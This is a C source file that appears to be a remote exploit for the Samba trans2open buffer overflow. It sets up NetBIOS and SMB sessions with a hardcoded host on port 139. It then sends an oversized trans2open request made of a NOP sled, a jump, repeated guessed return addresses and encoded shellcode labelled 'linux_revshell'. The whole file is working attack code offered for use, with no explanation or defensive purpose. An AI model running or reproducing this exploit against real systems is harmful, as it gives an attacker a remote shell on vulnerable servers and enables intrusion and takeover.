#include <arpa/inet.h>
#include <sys/socket.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, p1, 1)

struct NBIOS_HEADER {
  uint8_t type;
  uint8_t flag;
  uint16_t length;
};

struct SMB_HEADER {
  uint8_t protocol[4];
  uint8_t command;
  uint32_t status;
  uint8_t flag;
  uint16_t flag2;
  uint16_t PID_High;
  uint8_t sign[8];
  uint16_t reserved;
  uint16_t pid;
  uint16_t tid;
  uint16_t uid;
  uint16_t mid;
};

#pragma pack(pop, p1)

int getsock(int timeout) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);

  if (sock < 0) {
    return -1;
  }

  struct timeval tv;
  tv.tv_sec = 0;
  tv.tv_usec = timeout * 1000;

  if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(struct timeval)) <
      0) {
    return -1;
  }

  if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval)) <
      0) {
    return -1;
  }

  return sock;
};

int start_session(int sock) {

  uint8_t buffer[72] = {0};

  struct NBIOS_HEADER *nb_hdr = (struct NBIOS_HEADER *)buffer;

  nb_hdr->type = 0x81;
  nb_hdr->length = htons(68);

  *(buffer + 4) = 0x20;
  memcpy(buffer + 5, "CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 32);
  // 37 offset is zero

  *(buffer + 38) = 0x20;
  memcpy(buffer + 39, "EFELEEEAEAEAEAEAEAEAEAEAEAEAEAEA", 32);
  // 67 offset is zero

  if (send(sock, buffer, 68 + 4, 0) < 0) {
    printf("ERR: sending failed (timeout error)\n\t:From "
           "(nbios_session_setup)\n");

    close(sock);
    return -1;
  }

  uint8_t recv_buffer[4];
  int res = recv(sock, recv_buffer, 4, 0);

  if (res < 0) {
    printf("ERR: receiving failed (timeout error)\n\t:From "
           "(nbios_session_setup)\n");

    close(sock);
    return -1;
  } else if (res == 0) {
    printf("ERR: receiving failed (connection closed by remote host)\n\t:From "
           "(nbios_session_setup)\n)");

    close(sock);
    return -1;
  } else {
    if (*recv_buffer != 0x82) {
      printf("ERR: session denied\n\t:From (nbios_session_seutp)\n");

      close(sock);
      return -1;
    }

    return 0;

    // done
  }
}

int negotiate(int sock) {

  uint8_t buffer[51] = {0};

  struct NBIOS_HEADER *nb_hdr = (struct NBIOS_HEADER *)buffer;
  struct SMB_HEADER *smb_hdr = (struct SMB_HEADER *)(buffer + 4);

  nb_hdr->length = htons(47);

  memcpy(smb_hdr->protocol, "\xffSMB", 4);
  smb_hdr->command = 0x72;
  smb_hdr->flag = 0x08;
  smb_hdr->flag2 = 0x0001;
  // Predict values
  smb_hdr->uid = 100;
  smb_hdr->tid = 1;

  *(uint16_t *)(buffer + 37) = 0x000c;
  memcpy(buffer + 39, "\x02NT LM 0.12\x00", 12);

  if (send(sock, buffer, 51, 0) < 0) {
    printf(
        "ERR: sending failed (timeout error)\n\t:From (smb_com_negotiate)\n");

    close(sock);
    return -1;
  };

  uint8_t recv_buffer[128];
  int res = recv(sock, recv_buffer, 128, 0);

  if (res < 0) {
    printf("ERR: receiving failed (timeout error)\n\t:From "
           "(smb_com_negotiate)\n");

    close(sock);
    return -1;
  }

  if (res == 0) {
    printf("ERR: receiving failed (connection closed by remote host)\n\t:From "
           "(smb_com_negotiate)\n");

    close(sock);
    return -1;
  }

  if (!(*(recv_buffer + 8) == 0x72 && *((uint32_t *)(recv_buffer + 9)) == 0)) {
    printf("ERR: negotiatie failed\n\t:From (smb_com_negotiate)\n");

    close(sock);
    return -1;
  }

  return 0;
}

int send_smb_session_setup(int sock) {

  uint8_t buffer[68] = {0};

  struct NBIOS_HEADER *nb_hdr = (struct NBIOS_HEADER *)buffer;
  struct SMB_HEADER *smb_hdr = (struct SMB_HEADER *)(buffer + 4);

  nb_hdr->length = htons(63);

  memcpy(smb_hdr->protocol, "\xffSMB", 4);
  smb_hdr->command = 0x73;
  smb_hdr->flag = 0x08;
  smb_hdr->flag2 = 0x0001;

  uint8_t params[26] = {
      0xff,                   // andx command
      0x00,                   // andx reserved
      0x00, 0x00,             // andx offset
      0xff, 0xff,             // max buffer
      0x01, 0x00,             // max mpx
      0x00, 0x00,             // Virtual channel
      0x00, 0x00, 0x00, 0x00, // Session key
      0x00, 0x00,             // Ansi password length
      0x00, 0x00,             // Uni password length
      0x00, 0x00, 0x00, 0x00, // Reserved
      0x00, 0x00, 0x00, 0x00  // Capabilities
  };

  *(buffer + 36) = 0x0d;
  memcpy(buffer + 37, params, 26);

  *(uint16_t *)(buffer + 63) = 0x0002;

  if (send(sock, buffer, 67, 0) < 0) {
    printf("ERR: sending failed\n\t:From (session_setup)\n");

    close(sock);
    return -1;
  }

  uint8_t recv_buffer[256];

  int res = recv(sock, recv_buffer, 256, 0);

  if (res < 0) {
    printf("ERR: receiving failed (timeout error)\n\t:From (session_setup)\n");

    close(sock);
    return -1;
  }

  if (res == 0) {
    printf("ERR: receiving failed (connection closed by remote host)\n\t:From "
           "(session_setup)\n");

    close(sock);
    return -1;
  }

  if (!(*(recv_buffer + 8) == 0x73 && *(uint32_t *)(recv_buffer + 9) == 0)) {
    printf("ERR: session failed\n\t:From (session_setup)\n");

    close(sock);
    return -1;
  }

  return 0;
}
const uint8_t linux_revshell[] =
    "\xdb\xd4\xb8\xf3\x70\xd0\x49\xd9\x74\x24\xf4\x5a\x31\xc9"
    "\xb1\x12\x31\x42\x17\x83\xea\xfc\x03\xb1\x63\x32\xbc\x04"
    "\x5f\x45\xdc\x35\x1c\xf9\x49\xbb\x2b\x1c\x3d\xdd\xe6\x5f"
    "\xad\x78\x49\x60\x1f\xfa\xe0\xe6\x66\x92\x32\xb0\x98\x64"
    "\xdb\xc3\x9a\x79\x47\x4d\x7b\xc9\x11\x1d\x2d\x7a\x6d\x9e"
    "\x44\x9d\x5c\x21\x04\x35\x31\x0d\xda\xad\xa5\x7e\x33\x4f"
    "\x5f\x08\xa8\xdd\xcc\x83\xce\x51\xf9\x5e\x90";

int send_trans2open(int sock, unsigned long addr) {
  uint8_t buffer[4000] = {0};

  struct NBIOS_HEADER *nb_hdr = (struct NBIOS_HEADER *)buffer;
  struct SMB_HEADER *smb_hdr = (struct SMB_HEADER *)(buffer + 4);

  nb_hdr->length = htons(3996);

  memcpy(smb_hdr->protocol, "\xffSMB", 4);
  smb_hdr->command = 0x32; // trans2open
  smb_hdr->flag = 0x08;
  smb_hdr->flag2 = 0x0002;
  smb_hdr->uid = 100;
  smb_hdr->tid = 1;

  uint8_t data[] = {
      0x0f, // word count

      0x00, 0x00,             // total parameter count
      0xb8, 0x0b,             // total data count
      0xff, 0xff,             // max parameter count
      0xff, 0xff,             // max data count
      0xff,                   // max setup count
      0x00,                   // Pad
      0x00, 0x00,             // flags
      0x00, 0x00, 0x00, 0x00, // timeout
      0x00, 0x00,             // reserved
      0x00, 0x00,             // parameter count
      0x41, 0x00,             // parameter offset (21, 22)
      0x0b, 0xb8,             // data count
      0x45, 0x00,             // data offset (25, 26)
      0x01,                   // setup count
      0x00,                   // pad
      0x22, 0x00,             // setup word (open)

      0x0b, 0xb8, // byte count
      0x90        // data bytes

  };

  memcpy(buffer + 4 + 32, data, sizeof(data));

  memset(buffer + 4 + 32 + sizeof(data), 0x90, 3000);

  *(buffer + 1070) = 0xEB;
  *(buffer + 1071) = 0x70;

  unsigned long dummy = addr - 0x90;

  for (int i = 0; i < 24; i++) {
    int offset = 1073 + i * 8;
    memcpy(buffer + offset, &dummy, 4);
    memcpy(buffer + offset + 4, &addr, 4);
  }

  memcpy(buffer + 1774, linux_revshell, sizeof(linux_revshell));

  return send(sock, buffer, 4000, 0);
}

int probe_address(uint32_t addr) {
  // Socket
  int sock = getsock(200);
  if (sock < 0) {
    printf("ERR: socket error\n");
    return -1;
  }

  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(139);
  inet_pton(AF_INET, "192.168.1.104", &sa.sin_addr);
  memset(sa.sin_zero, 0, 8);

  if (connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr)) < 0) {
    printf("ERR: connection error\n");
    return -1;
  }

  // prelude
  if (start_session(sock) < 0) {
    return -1;
  };
  if (negotiate(sock) < 0) {
    return -1;
  };
  if (send_smb_session_setup(sock) < 0) {
    return -1;
  };

  return send_trans2open(sock, addr);

  // XXX: trans2 open2
};

int main() {

  // ------------------ MAIN -----------------------

  unsigned long start_addr = 0xbffffe4d;
  unsigned long end_addr = 0xbffffff0;

  unsigned long step = 512;

  probe_address(0xbffff458);
}
